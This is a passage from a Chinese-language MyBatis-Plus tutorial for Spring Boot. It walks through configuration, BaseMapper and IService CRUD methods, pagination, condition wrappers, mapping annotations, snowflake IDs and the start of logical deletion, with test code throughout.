--&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!-- mybatis-plus  --&gt;&lt;dependency&gt;&lt;groupId&gt;com.baomidou&lt;/groupId&gt;&lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt;&lt;version&gt;3.5.3.1&lt;/version&gt;&lt;/dependency&gt;&lt;!-- 数据库相关配置启动器 --&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!-- druid启动器的依赖  --&gt;&lt;dependency&gt;&lt;groupId&gt;com.alibaba&lt;/groupId&gt;&lt;artifactId&gt;druid-spring-boot-3-starter&lt;/artifactId&gt;&lt;version&gt;1.2.21&lt;/version&gt;&lt;/dependency&gt;&lt;!-- 驱动类--&gt;&lt;dependency&gt;&lt;groupId&gt;mysql&lt;/groupId&gt;&lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;&lt;version&gt;8.0.28&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt;&lt;groupId&gt;org.projectlombok&lt;/groupId&gt;&lt;artifactId&gt;lombok&lt;/artifactId&gt;&lt;version&gt;1.18.28&lt;/version&gt;&lt;/dependency&gt;&lt;/dependencies&gt;&lt;!--    SpringBoot应用打包插件--&gt;&lt;build&gt;&lt;plugins&gt;&lt;plugin&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;&lt;/plugin&gt;&lt;/plugins&gt;&lt;/build&gt;
&lt;/project&gt;
③ 配置文件和启动类
application.yaml：
# 连接池配置
spring:datasource:type: com.alibaba.druid.pool.DruidDataSourcedruid:url: jdbc:mysql:///mybatis-exampleusername: rootpassword: 123456driver-class-name: com.mysql.cj.jdbc.Drivermybatis-plus:configuration:log-impl: org.apache.ibatis.logging.stdout.StdOutImpl # 控制态输入日志（sql语句）type-aliases-package: com.mihoyo.pojo #起别名
注意：
mybatis-plus 已经将驼峰式映射的默认值设置为 true， 无需手动设置
启动类：
@MapperScan("com.mihoyo.mapper")
@SpringBootApplication
public class MainApplication {public static void main(String[] args) {SpringApplication.run(MainApplication.class,args);}}
④ 功能编码
编写实体类 User.java（此处使用了 Lombok 简化代码）
@Data
public class User {private Long id;private String name;private Integer age;private String email;
}
编写 Mapper 包下的 UserMapper 接口
public interface UserMapper extends BaseMapper&lt;User&gt; {}
注意：
继承mybatis-plus提供的基础Mapper接口，自带 crud 方法！
⑤ 测试和使用
添加测试类，进行功能测试：
@SpringBootTest //springboot下测试环境注解
public class MybatisPlusTest {@Autowiredprivate UserMapper userMapper;@Testpublic void testSelect() {//查询全部数据List&lt;User&gt; userList = userMapper.selectList(null);//条件为空userList.forEach(System.out::println);}
}
总结：
通过以上几个简单的步骤，我们就实现了 User 表的 CRUD 功能，甚至
连 XML 文件都不用编写
。
从以上步骤中，我们可以看到集成 MyBatis-Plus 非常的简单，只需要引入 starter 工程，并配置 mapper 扫描路径即可。
二、MyBatis-Plus核心功能
1.基于Mapper接口CRUD
通用 CRUD 封装 BaseMapper (opens new window) 接口， Mybatis-Plus 启动时
自动解析实体表关系映射转换为 Mybatis 内部对象
注入容器。
内部包含常见的单表操作：
（1）Insert 方法
// 插入一条记录
// T 就是要插入的实体对象
// 默认主键生成策略为雪花算法（后面讲解）
int insert(T entity);
参数说明：
类型
参数名
描述
T
entity
实体对象
注意：
T，即实体类名 必须要和 数据库表名 相同
，Mybatis-Plus 会根据 实体类名 自动映射到 数据库对应的表。
测试：
@SpringBootTest //springboot下测试环境注解
public class MybatisPlusTest {@Autowiredprivate UserMapper userMapper;@Testpublic void test_insert(){User user = new User();user.setName("张三");user.setAge(18);user.setEmail("xxxx@qq.com");//baseMapper提供的数据库插入方法int row = userMapper.insert(user);System.out.println("row = " + row);}
}
运行结果：
（2）Delete方法
// 根据 entity 条件，删除记录
int delete(@Param(Constants.WRAPPER) Wrapper&lt;T&gt; wrapper);// 删除（根据ID 批量删除）
int deleteBatchIds(@Param(Constants.COLLECTION) Collection&lt;? extends Serializable&gt; idList);// 根据 ID 删除
int deleteById(Serializable id);// 根据 columnMap 条件，删除记录
int deleteByMap(@Param(Constants.COLUMN_MAP) Map&lt;String, Object&gt; columnMap);
参数说明：
类型
参数名
描述
Wrapper&lt;T&gt;
wrapper
实体对象封装操作类（可以为 null）
Collection&lt;? extends Serializable&gt;
idList
主键 ID 列表(不能为 null 以及 empty)
Serializable
id
主键 ID
Map&lt;String, Object&gt;
columnMap
表字段 map 对象
测试：
@Testpublic void test_delete(){//根据id删除int rows = userMapper.deleteById(1846463349906759682L);System.out.println("rows = " + rows);//根据条件（age=20）删除Map param = new HashMap();param.put("age",20);//如果有其他条件继续putint i = userMapper.deleteByMap(param);System.out.println("i = " + i);}
运行结果：
（3）Update 方法
// 根据 whereWrapper 条件，更新记录
int update(@Param(Constants.ENTITY) T updateEntity, @Param(Constants.WRAPPER) Wrapper&lt;T&gt; whereWrapper);// 根据 ID 修改  主键属性必须值
int updateById(@Param(Constants.ENTITY) T entity);
参数说明：
类型
参数名
描述
T
entity
实体对象 (set 条件值,可为 null)
Wrapper&lt;T&gt;
updateWrapper
实体对象封装操作类（可以为 null,里面的 entity 用于生成 where 语句）
测试：
@Testpublic void test_update() {//user  id=1的age改为30User user = new User();user.setId(1L);user.setAge(30);// update user set age=30 where id=1（当有属性值为空时，该属性不修改）int i = userMapper.updateById(user);System.out.println("i = " + i);//将所有人的年龄改为22User user1 = new User();user1.setAge(22);// update user set age=22int rows = userMapper.update(user1, null);}
注意：
①
根据 id 修改，user 的 id 属性必须给值
。
② 修改时，如果 user 有
部分属性为空，该属性就不修改
。
③ 由于 ② 的因素，
属性的类型必须为包装类型
。 如果是基本数据类型，会存在默认值。
比如：
age 如果定义成 int 类型，即使没有通过 set 方法赋值，也会有默认值 0，修改时会被修改为 0。
如果定义成 Integer 类型，没有赋值就是 null，就不会发生修改。
运行结果：
（4）Select方法
// 根据 ID 查询
T selectById(Serializable id);// 根据 entity 条件，查询一条记录
T selectOne(@Param(Constants.WRAPPER) Wrapper&lt;T&gt; queryWrapper);// 查询（根据ID 批量查询）
List&lt;T&gt; selectBatchIds(@Param(Constants.COLLECTION) Collection&lt;? extends Serializable&gt; idList);// 根据 entity 条件，查询全部记录
List&lt;T&gt; selectList(@Param(Constants.WRAPPER) Wrapper&lt;T&gt; queryWrapper);// 查询（根据 columnMap 条件）
List&lt;T&gt; selectByMap(@Param(Constants.COLUMN_MAP) Map&lt;String, Object&gt; columnMap);// 根据 Wrapper 条件，查询全部记录
List&lt;Map&lt;String, Object&gt;&gt; selectMaps(@Param(Constants.WRAPPER) Wrapper&lt;T&gt; queryWrapper);// 根据 Wrapper 条件，查询全部记录。注意： 只返回第一个字段的值
List&lt;Object&gt; selectObjs(@Param(Constants.WRAPPER) Wrapper&lt;T&gt; queryWrapper);// 根据 entity 条件，查询全部记录（并翻页）
IPage&lt;T&gt; selectPage(IPage&lt;T&gt; page, @Param(Constants.WRAPPER) Wrapper&lt;T&gt; queryWrapper);// 根据 Wrapper 条件，查询全部记录（并翻页）
IPage&lt;Map&lt;String, Object&gt;&gt; selectMapsPage(IPage&lt;T&gt; page, @Param(Constants.WRAPPER) Wrapper&lt;T&gt; queryWrapper);// 根据 Wrapper 条件，查询总记录数
Integer selectCount(@Param(Constants.WRAPPER) Wrapper&lt;T&gt; queryWrapper);
参数说明：
类型
参数名
描述
Serializable
id
主键 ID
Wrapper&lt;T&gt;
queryWrapper
实体对象封装操作类（可以为 null）
Collection&lt;? extends Serializable&gt;
idList
主键 ID 列表(不能为 null 以及 empty)
Map&lt;String, Object&gt;
columnMap
表字段 map 对象
IPage&lt;T&gt;
page
分页查询条件（可以为 RowBounds.DEFAULT）
测试：
@Testpublic void test_select(){//根据id查询User user = userMapper.selectById(1);System.out.println("user = " + user);//根据id集合查询List&lt;Long&gt; ids=new ArrayList&lt;&gt;();ids.add(1L);ids.add(2L);List&lt;User&gt; list = userMapper.selectBatchIds(ids);System.out.println("list = " + list);}
运行结果：
2.基于Service接口CRUD
通用 Service CRUD 封装 IService (opens new window) 接口，进一步封装 CRUD 采用
get 查询单行
remove 删除
list 查询集合
page 分页
前缀命名方式区分 Mapper 层避免混淆。
对比Mapper接口CRUD区别：
① service添加了批量方法
② service层的方法自动添加事务
使用 Iservice 接口方式：
接口继承 IService 接口
public interface UserService extends IService&lt;User&gt; {
}
实现类继承 ServiceImpl 实现类
@Service
public class UserServiceImpl extends ServiceImpl&lt;UserMapper,User&gt; implements UserService{}
注意：
IService 接口中有一半方法默认实现，还有一半没有实现的抽象方法。
所以想要使用 IService 中的 crud 方法，还得重写另一半没有实现的方法。
ServiceImpl类 实现了 IService 接口，已经重写另一半方法，我们可以直接继承。
ServiceImpl
底层还是通过 mapper 对象调用方法，所以泛型中需要对应的 mapper 接口
。
（1）save 方法
// 插入一条记录（选择字段，策略插入）
boolean save(T entity);
// 插入（批量）
boolean saveBatch(Collection&lt;T&gt; entityList);
// 插入（批量）
boolean saveBatch(Collection&lt;T&gt; entityList, int batchSize);
参数说明：
类型
参数名
描述
T
entity
实体对象
Collection&lt;T&gt;
entityList
实体对象集合
int
batchSize
插入批次数量
返回值：
boolean，表示插入操作是否成功。
测试：
@Testpublic void test_save() {User user1 = new User();user1.setAge(18);user1.setName("张三");user1.setEmail("xxx@qq.com");User user2 = new User();user2.setAge(20);user2.setName("李四");user2.setEmail("yyy@qq.com");List&lt;User&gt; list = new ArrayList&lt;&gt;();list.add(user1);list.add(user2);boolean b = userService.saveBatch(list);System.out.println("b = " + b);}
运行结果：
（2）saveOrUpdate方法
// TableId 注解存在更新记录，否插入一条记录
boolean saveOrUpdate(T entity);
// 根据updateWrapper尝试更新，否继续执行saveOrUpdate(T)方法
boolean saveOrUpdate(T entity, Wrapper&lt;T&gt; updateWrapper);
// 批量修改插入
boolean saveOrUpdateBatch(Collection&lt;T&gt; entityList);
// 批量修改插入
boolean saveOrUpdateBatch(Collection&lt;T&gt; entityList, int batchSize);
参数说明：
类型
参数名
描述
T
entity
实体对象
Wrapper&lt;T&gt;
updateWrapper
实体对象封装操作类 UpdateWrapper
Collection&lt;T&gt;
entityList
实体对象集合
int
batchSize
插入批次数量
返回值：
boolean，表示插入或更新操作是否成功。
测试：
@Testpublic void test_saveOrUpdate() {/* 如果id有值，不为null --&gt; 修改如果id没值，为null  --&gt; 保存（插入）*/User user1 = new User();user1.setAge(18);user1.setName("Tom");user1.setEmail("xxx@qq.com");boolean b1 = userService.saveOrUpdate(user1);//插入System.out.println("b1 = " + b1);User user2 = new User();user2.setId(1L);user2.setAge(20);user2.setName("Jerry");user2.setEmail("yyy@qq.com");boolean b2 = userService.saveOrUpdate(user2);//修改System.out.println("b2 = " + b2);}
运行结果：
（3）remove 方法
// 根据 queryWrapper 设置的条件，删除记录
boolean remove(Wrapper&lt;T&gt; queryWrapper);
// 根据 ID 删除
boolean removeById(Serializable id);
// 根据 columnMap 条件，删除记录
boolean removeByMap(Map&lt;String, Object&gt; columnMap);
// 删除（根据ID 批量删除）
boolean removeByIds(Collection&lt;? extends Serializable&gt; idList);
参数说明：
类型
参数名
描述
Wrapper&lt;T&gt;
queryWrapper
实体包装类 QueryWrapper
Serializable
id
主键 ID
Map&lt;String, Object&gt;
columnMap
表字段 map 对象
Collection&lt;? extends Serializable&gt;
idList
主键 ID 列表
返回值：
boolean，表示删除操作是否成功。
测试：
@Testpublic void test_remove() {boolean b = userService.removeById(1846557126650564609L);System.out.println("b = " + b);}
运行结果：
（4）update 方法
// 根据 UpdateWrapper 条件，更新记录 需要设置sqlset
boolean update(Wrapper&lt;T&gt; updateWrapper);
// 根据 whereWrapper 条件，更新记录
boolean update(T updateEntity, Wrapper&lt;T&gt; whereWrapper);
// 根据 ID 选择修改
boolean updateById(T entity);
// 根据ID 批量更新
boolean updateBatchById(Collection&lt;T&gt; entityList);
// 根据ID 批量更新
boolean updateBatchById(Collection&lt;T&gt; entityList, int batchSize);
参数说明：
类型
参数名
描述
Wrapper&lt;T&gt;
updateWrapper
实体对象封装操作类 UpdateWrapper
T
entity
实体对象
Collection&lt;T&gt;
entityList
实体对象集合
int
batchSize
更新批次数量
返回值：
boolean，表示更新操作是否成功。
测试：
@Testpublic void test_update() {User user = new User();user.setId(1L);user.setAge(18);user.setName("Tom");user.setEmail("xxx@qq.com");boolean b = userService.updateById(user);System.out.println("b = " + b);}
运行结果：
（5）get 和 list 方法
查询：
// 根据 ID 查询
T getById(Serializable id);
// 根据 Wrapper，查询一条记录。结果集，如果是多个会抛出异常，随机取一条加上限制条件 wrapper.last("LIMIT 1")
T getOne(Wrapper&lt;T&gt; queryWrapper);
// 根据 Wrapper，查询一条记录
T getOne(Wrapper&lt;T&gt; queryWrapper, boolean throwEx);
// 根据 Wrapper，查询一条记录
Map&lt;String, Object&gt; getMap(Wrapper&lt;T&gt; queryWrapper);
// 根据 Wrapper，查询一条记录
&lt;V&gt; V getObj(Wrapper&lt;T&gt; queryWrapper, Function&lt;? super Object, V&gt; mapper);集合：
// 查询所有
List&lt;T&gt; list();
// 查询列表
List&lt;T&gt; list(Wrapper&lt;T&gt; queryWrapper);
// 查询（根据ID 批量查询）
Collection&lt;T&gt; listByIds(Collection&lt;? extends Serializable&gt; idList);
// 查询（根据 columnMap 条件）
Collection&lt;T&gt; listByMap(Map&lt;String, Object&gt; columnMap);
// 查询所有列表
List&lt;Map&lt;String, Object&gt;&gt; listMaps();
// 查询列表
List&lt;Map&lt;String, Object&gt;&gt; listMaps(Wrapper&lt;T&gt; queryWrapper);
// 查询全部记录
List&lt;Object&gt; listObjs();
// 查询全部记录
&lt;V&gt; List&lt;V&gt; listObjs(Function&lt;? super Object, V&gt; mapper);
// 根据 Wrapper 条件，查询全部记录
List&lt;Object&gt; listObjs(Wrapper&lt;T&gt; queryWrapper);
// 根据 Wrapper 条件，查询全部记录
&lt;V&gt; List&lt;V&gt; listObjs(Wrapper&lt;T&gt; queryWrapper, Function&lt;? super Object, V&gt; mapper);
参数说明：
类型
参数名
描述
Serializable
id
主键 ID
Wrapper&lt;T&gt;
queryWrapper
实体对象封装操作类 QueryWrapper
boolean
throwEx
有多个 result 是否抛出异常
T
entity
实体对象
Function&lt;? super Object, V&gt;
mapper
转换函数
Collection&lt;? extends Serializable&gt;
idList
主键 ID 列表
Map&lt;String, Object&gt;
columnMap
表字段 map 对象
返回值：
查询结果，可能是实体对象、Map 对象或其他类型。
测试：
@Testpublic void test_getOrList(){User user = userService.getById(1L);// get返回的是单个对象System.out.println("user = " + user);List&lt;User&gt; list = userService.list(null);//查询全部，list返回的是一个集合System.out.println("list = " + list);}
运行结果：
3.分页查询实现
① 导入分页插件
@MapperScan("com.mihoyo.mapper")
@SpringBootApplication
public class MainApplication {public static void main(String[] args) {SpringApplication.run(MainApplication.class,args);}//mybatis-plus插件集合加入到ioc容器@Beanpublic MybatisPlusInterceptor plusInterceptor(){//mybatis-plus的插件集合（所有插件都加入到这个集合：分页插件，乐观锁插件...）MybatisPlusInterceptor mybatisPlusInterceptor = new MybatisPlusInterceptor();//加入分页插件（参数：数据库类型）mybatisPlusInterceptor.addInnerInterceptor(new PaginationInnerInterceptor(DbType.MYSQL));return mybatisPlusInterceptor;}}
② 使用分页查询
@SpringBootTest
public class MybatisPlusTest {@Autowiredprivate UserMapper userMapper;@Testpublic void test_page(){//接口：IPage --&gt; 实现类：Page(页码，页容量)Page&lt;User&gt; page = new Page&lt;&gt;(1,3);userMapper.selectPage(page, null);//结果也会被封装进page中long current = page.getCurrent();//页码System.out.println("current = " + current);long size = page.getSize();//页容量System.out.println("size = " + size);List&lt;User&gt; records = page.getRecords();//当前页的数据System.out.println("records = " + records);long total = page.getTotal();//总条数System.out.println("total = " + total);}
}
**************** Question：如果想要自定义一个能够分页的查询方法，如何实现呢？****************
步骤：
① mapper 接口定义方法
public interface UserMapper extends BaseMapper&lt;User&gt; {//定义一个方法：根据age进行查询，且分页IPage&lt;User&gt; queryByAge(IPage&lt;User&gt; page, @Param("age") Integer age);
}
② mapper.xml
&lt;?xml version="1.0" encoding="UTF-8" ?&gt;
&lt;!DOCTYPE mapperPUBLIC "-//mybatis.org//DTD Mapper 3.0//EN""https://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;&lt;mapper namespace="com.mihoyo.mapper.UserMapper"&gt;&lt;!-- 查询返回的是user集合，所以resultType是集合的泛型，也就是page的泛型user --&gt;&lt;select id="queryByAge" resultType="user"&gt;select * from user where age &gt; #{age}&lt;/select&gt;
&lt;/mapper&gt;
③ 测试
@Testpublic void testMyPage(){Page&lt;User&gt; page = new Page&lt;&gt;(1,3);userMapper.queryByAge(page,1);long current = page.getCurrent();//页码System.out.println("current = " + current);long size = page.getSize();//页容量System.out.println("size = " + size);List&lt;User&gt; records = page.getRecords();//当前页的数据System.out.println("records = " + records);long total = page.getTotal();//总条数System.out.println("total = " + total);}
运行结果：
4.条件构造器使用
（1）条件构造器继承
QueryWrapper&lt;User&gt; queryWrapper = new QueryWrapper&lt;&gt;();
queryWrapper.eq("name", "John"); // 添加等于条件
queryWrapper.ne("age", 30); // 添加不等于条件
queryWrapper.like("email", "@gmail.com"); // 添加模糊匹配条件
等同于： 
delete from user where name = "John" and age != 30and email like "%@gmail.com%"
// 根据 entity 条件，删除记录
int delete(@Param(Constants.WRAPPER) Wrapper&lt;T&gt; wrapper);
使用MyBatis-Plus 的条件构造器
，你可以构建灵活、高效的查询条件，而不需要手动编写复杂的 SQL 语句。
它提供了许多方法来支持各种条件操作符，并且可以通过链式调用来组合多个条件
。这样可以
简化查询的编写过程，并提高开发效率
。
（2）条件构造器继承结构
条件构造器类结构：
Wrapper ： 条件构造抽象类，最顶端父类
AbstractWrapper ： 用于查询条件封装，生成 sql 的 where 条件
QueryWrapper ： 查询/删除条件封装
UpdateWrapper ： 修改条件封装
AbstractLambdaWrapper ： 使用 Lambda 语法
LambdaQueryWrapper ：用于 Lambda 语法使用的查询 Wrapper
LambdaUpdateWrapper ： Lambda 更新封装 Wrapper
（3）基于QueryWrapper 组装条件
Ⅰ.组装查询条件
需求：查询用户名包含 a，年龄在 20 到 30 之间，并且邮箱不为空的用户信息
@SpringBootTest
public class MybatisPlusQueryWrapper {@Autowiredprivate UserMapper userMapper;@Testpublic void test_01(){QueryWrapper&lt;User&gt; queryWrapper = new QueryWrapper&lt;&gt;();//条件（动态调用wrapper的方法完成拼接）/*queryWrapper.like("name","a");queryWrapper.between("age",20,30);queryWrapper.isNotNull("email");*///链式调用queryWrapper.like("name","a").between("age",20,30).isNotNull("email");//select * from user where name like "%a%" and age &gt;= 20 age &lt;= 30 email is not nullList&lt;User&gt; users = userMapper.selectList(queryWrapper);}
}
运行结果：
Ⅱ. 组装排序条件
需求：按年龄降序查询用户，如果年龄相同则按 id 升序排列
@Testpublic void test_02(){QueryWrapper&lt;User&gt; queryWrapper = new QueryWrapper&lt;&gt;();queryWrapper.orderByDesc("age").orderByAsc("id");// order by age desc, id asc;List&lt;User&gt; users = userMapper.selectList(queryWrapper);}
运行结果：
Ⅲ. 组装删除条件
需求：删除 email 为空的用户
@Testpublic void test_03() {QueryWrapper&lt;User&gt; queryWrapper = new QueryWrapper&lt;&gt;();queryWrapper.isNull("email");userMapper.delete(queryWrapper);}
运行结果：
Ⅳ. and 和 or 关键字使用(修改)：
需求：将年龄大于 20
并且
用户名中包含有 a
或
邮箱为 null 的用户信息修改
@Testpublic void test_04(){QueryWrapper&lt;User&gt; queryWrapper = new QueryWrapper&lt;&gt;();queryWrapper.gt("age",20).like("name","a") //条件直接调用方法，默认 and 拼接.or().isNull("email"); //想要使用 or 拼接，前面必须紧跟着一个 or()User user = new User();user.setAge(88);user.setEmail("hehehe@qq.com");userMapper.update(user,queryWrapper);}
运行结果：
Ⅴ. 指定列映射查询
需求：查询用户信息的 name 和 age 字段
@Testpublic void test_05() {QueryWrapper&lt;User&gt; queryWrapper = new QueryWrapper&lt;&gt;();queryWrapper.gt("id", 1L);//默认是查询全部列queryWrapper.select("name", "age");//指定要查询的列名userMapper.selectList(queryWrapper);}
运行结果：
Ⅵ. condition判断组织条件
需求：前端传入了两个参数（name 和 age），如果 name 不为空，作为 = 条件查询。age &gt; 18，作为 = 条件查询
方案一：手动判断
@Testpublic void test_06() {//模拟前端输入String name = "xxx";Integer age = 20;QueryWrapper&lt;User&gt; queryWrapper = new QueryWrapper&lt;&gt;();//动态条件判断if (!StringUtils.isBlank(name)) {queryWrapper.eq("name", name);}if (age != null || age &gt; 18) {queryWrapper.eq("age", age);}userMapper.selectList(queryWrapper);}
方案二：拼接 condition 判断
每个条件方法都会有一个 boolean 类型的 condition，允许我们放入一个比较表达式。
如果表达式为 true，整个条件生效；否则不生效。
@Testpublic void test_06() {//模拟前端输入String name = "xxx";Integer age = 20;QueryWrapper&lt;User&gt; queryWrapper = new QueryWrapper&lt;&gt;();queryWrapper.eq(!StringUtils.isBlank(name),"name",name);queryWrapper.eq(age != null || age &gt; 18,"age", age);userMapper.selectList(queryWrapper);}
运行结果：
（4）基于 UpdateWrapper 组装条件
需求：将年龄大于 20
并且
用户名中包含有 a
或
邮箱为 null 的用户信息修改
使用 queryWrapper：
@Testpublic void test_04(){QueryWrapper&lt;User&gt; queryWrapper = new QueryWrapper&lt;&gt;();queryWrapper.gt("age",20).like("name","a") //条件直接调用方法，默认 and 拼接.or().isNull("email"); //想要使用 or 拼接，前面必须紧跟着一个 or()User user = new User();user.setAge(88);user.setEmail("hehehe@qq.com");userMapper.update(user,queryWrapper);}
缺点：
①
必须要准备修改的实体类数据（User 对象）
②
不能将某个属性值修改为 null。
（queryWrapper 发现该属性值是 null，就不会对其修改）
使用 updateWrapper：
@Testpublic void test_update(){UpdateWrapper&lt;User&gt; queryWrapper = new UpdateWrapper&lt;&gt;();queryWrapper.gt("age",20).like("name","a").or().isNull("email").set("name",null)//直接修改，可以是任意值.set("age",99);userMapper.update(null,queryWrapper);}
优点：
①
可以通过 set 方法直接携带修改数据
②
可以修改成任意数据
运行结果：
（5）基于LambdaQueryWrapper 组装条件
需求：查询用户名包含 a，年龄在 20 到 30 之间，并且邮箱不为空的用户信息
@Testpublic void test_01() {QueryWrapper&lt;User&gt; queryWrapper = new QueryWrapper&lt;&gt;();queryWrapper.like("name", "a").between("age", 20, 30).isNotNull("email");//select * from user where name like "%a%" and age &gt;= 20 age &lt;= 30 email is not nullList&lt;User&gt; users = userMapper.selectList(queryWrapper);}
缺点：
在条件方法（like，between...）中，我们每次都要书写属性名的字符串，这很容易出现书写错误！
使用
方法引用
，可以有效避免这个问题。
@Testpublic void test_01() {//使用LambdaQueryWrapperLambdaQueryWrapper&lt;User&gt; queryWrapper = new LambdaQueryWrapper&lt;&gt;();queryWrapper.like(User::getName, "a").between(User::getAge, 20, 30).isNotNull(User::getEmail);//select * from user where name like "%a%" and age &gt;= 20 age &lt;= 30 email is not nullList&lt;User&gt; users = userMapper.selectList(queryWrapper);}
注意：
虽然被引用处是一个函数式接口，可以使用 Lambda 表达式。
但由于 MybatisPLus 的 LambdaQueryWrapper 在内部对 SFunction 接口 进行了封装，
只有使用
方法引用
能确保发挥 LambdaQueryWrapper 的完整功能
，并避免翻译错误。
所以，
不能直接使用 Lambda 表达式
：like(user -&gt; user.getName(),"a")
（6）基于 LambdaUpdateWrapper 组装条件
需求：将年龄大于 20
并且
用户名中包含有 a
或
邮箱为 null 的用户信息修改
使用 updateWrapper：
@Testpublic void test_update(){UpdateWrapper&lt;User&gt; queryWrapper = new UpdateWrapper&lt;&gt;();queryWrapper.gt("age",20).like("name","a").or().isNull("email").set("name",null)//直接修改，可以是任意值.set("age",99);userMapper.update(null,queryWrapper);}
使用 LambdaUpdateWrapper：
@Testpublic void test_update(){//使用LambdaUpdateWrapperLambdaUpdateWrapper&lt;User&gt; queryWrapper = new LambdaUpdateWrapper&lt;&gt;();queryWrapper.gt(User::getAge,20).like(User::getName,"a").or().isNull(User::getEmail).set(User::getAge,null).set(User::getEmail,99);userMapper.update(null,queryWrapper);}
5.核心注解使用
（1）理解和介绍
MyBatis-Plus是一个基于 MyBatis 框架的增强工具，提供了一系列简化和增强的功能，用于加快开发人员在使用 MyBatis 进行数据库访问时的效率。
MyBatis-Plus 提供了一种基于注解的方式来定义和映射数据库操作，其中的注解起到了重要作用。
理解：
public interface UserMapper extends BaseMapper&lt;User&gt; {}
此接口对应的方法为什么会自动触发 user 表的crud呢？
默认情况下， 根据指定的 &lt;实体类&gt; 的名称对应数据库表名，属性名对应数据库的列名。
但不是所有数据库的信息和实体类都完全映射！
例如： 表名 t_user → 实体类 User 这时候就不对应了。
自定义映射关系就可以使用 mybatis-plus 提供的注解即可！
（2）@TableName 注解
描述：
表名注解，标识实体类对应的表
使用位置：
实体类
@TableName("t_user") //对应数据库表名
public class User {private Long id;private String name;private Integer age;private String email;
}
注意：
①
特殊情况：如果表名和实体类名相同（忽略大小写）可以省略该注解
②
如果每个数据库表都以 t_ 开头
，就要对每个实体类加上 @TableName 注解，过于麻烦。
可以在 application.yml 中设置 全局设置前缀：
mybatis-plus: # mybatis-plus的配置global-config:db-config:table-prefix: t_ # 表名前缀字符串
（3）@TableId 注解
描述：
主键注解
使用位置：
实体类主键字段
@TableName("t_user")
public class User {@TableId(value="主键列名",type=主键策略)private Long id;private String name;private Integer age;private String email;
}
属性：
属性
类型
必须指定
默认值
描述
value
String
否
""
主键字段名
type
Enum
否
IdType.NONE
指定主键类型
IdType 属性可选值：
值
描述
AUTO
数据库 ID 自增
(mysql 配置主键自增长 auto_increment)
ASSIGN_ID（默认）
分配 ID(主键类型为 Number(Long )或 String)(since 3.3.0)，
使用接口
IdentifierGenerator
的
nextId
方法
(默认实现类为
DefaultIdentifierGenerator
雪花算法)
细节：
① 雪花算法
（默认）
：
数据库主键类型设置：bigint / varchar(64)
实体类主键类型设置：long / string
随机生成一个主键值，与之前的不会重复
② auto：
mysql 在创建数据库表时，必须要给主键设置自增：auto_increment
③ 如果有多个表都想设置主键为自增，一个个设置会很麻烦，可以在 application.yml 中全局设置 :
mybatis-plus: # mybatis-plus的配置global-config:db-config:id-type: auto # 全局设置主键策略
使用场景：
①
主键
的列名 与 实体类的属性名不一致
--&gt; 使用 value 指定主键名
（u_id --&gt; uid 是一致的，因为 MyBatis-Plus 会自动开启驼峰命名风格映射）
②
指定插入新数据时，主键值如何生成
（自增 还是 随机 --&gt; 使用 IdType 指定主键策略）。
雪花算法（Snowflake Algorithm）：
是一种用于生成唯一ID的算法。它由Twitter公司提出，用于解决分布式系统中生成全局唯一ID的需求。
在传统的自增ID生成方式中，使用单点数据库生成 ID 会成为系统的瓶颈，而
雪花算法通过在分布式系统中生成唯一ID，避免了单点故障和性能瓶颈的问题。
雪花算法生成的ID是一个64位的整数，由以下几个部分组成：
① 时间戳：41位，精确到毫秒级，可以使用69年。
② 节点ID：10位，用于标识分布式系统中的不同节点。
③ 序列号：12位，表示在同一毫秒内生成的不同ID的序号。
通过将这三个部分组合在一起，雪花算法可以在分布式系统中生成全局唯一的ID，并保证ID的生成顺序性。
雪花算法的工作方式如下：
① 当前时间戳从某一固定的起始时间开始计算，可以用于计算 ID 的时间部分。
② 节点 ID 是分布式系统中每个节点的唯一标识，可以通过配置或自动分配的方式获得。
③ 序列号用于记录在同一毫秒内生成的不同ID的序号，从0开始自增，最多支持4096个ID生成。
需要注意的是，
雪花算法依赖于系统的时钟
，需要确保系统时钟的准确性和单调性，否则可能会导致生成的ID不唯一或不符合预期的顺序。
总结：
雪花算法是一种简单但有效的生成唯一ID的算法，广泛应用于分布式系统中，如微服务架构、分布式数据库、分布式锁等场景，以满足全局唯一标识的需求。
（4）@TableField 注解
描述：
字段注解（非主键）
@TableName("t_user")
public class User {@TableIdprivate Long id;@TableField("nickname")private String name;private Integer age;private String email;
}
属性
类型
必须指定
默认值
描述
value
String
否
""
数据库字段名
exist
boolean
否
true
是否为数据库字段
使用场景：
①
非主键的列名 与 实体类的属性名不一致
--&gt; 使用 value 指定字段名
（u_name --&gt; uname 是一致的，因为 MyBatis-Plus 会自动开启驼峰命名风格映射）
②
该实体类中定义了其他成员变量，但并不是作为数据库表中的字段
--&gt; 使用 exist = false
三、MyBatis-Plus 高级扩展
1.逻辑删除实现
概念:
逻辑删除，可以方便地实现对数据库记录的逻辑删除而不是物理删除。逻辑删除是指通过更改记录的状态或添加标记字段来模拟删除操作，从而保留了删除前的数据，便于后续的数据分析和恢复。
物理删除：
真实删除，将对应数据从数据库中删除，之后查询不到此条被删除的数据
逻辑删除：
假删除，将对应数据中代表是否被删除字段的状态修改为 “被删除状态”，之后在数据库中仍旧能看到此条数据记录
逻辑删除实现:
① 数据库和实体类添加逻辑删除字段（可以是一个布尔类型、整数类型或枚举类型）
# int 类型 规定： 1 逻辑删除 0 未逻辑删除
ALTER TABLE USER ADD deleted INT DEFAULT 0 ;
② 实体类添加逻辑删除属性，属性添加 @TableLogic 注解
@Data
public class User {// @TableIdprivate Integer id;private String name;private Integer age;private String email;@TableLogic//逻辑删除字段 int mybatis-plus下,默认 逻辑删除值为1 未逻辑删除 0 private Integer deleted;
}
细节：
①  实体类中的逻辑删除属性，要与数据库中的逻辑删除字段相对应。
② 设置逻辑删除后：
删除数据，自动变成修改此条数据的的逻辑删除字段 deleted，将其变成 1
查询数据，默认只查询 deleted = 0，即未被逻辑删除的数据
③
如果有多个表都要设置逻辑删除，可以进行全局设置：
